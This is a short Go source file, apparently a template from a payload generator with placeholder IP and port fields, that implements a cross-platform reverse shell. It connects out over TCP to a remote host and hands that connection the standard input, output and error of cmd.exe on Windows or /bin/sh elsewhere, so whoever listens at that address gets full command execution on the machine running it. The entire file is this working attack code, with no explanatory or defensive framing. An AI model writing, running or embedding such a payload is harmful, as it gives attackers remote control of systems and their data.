package main

import (
	"net"
	"os/exec"
	"runtime"
)

func main() {
	c, _ := net.Dial("tcp", "{{ ip }}:{{ port }}")
	if c == nil {
		return
	}
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}

	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
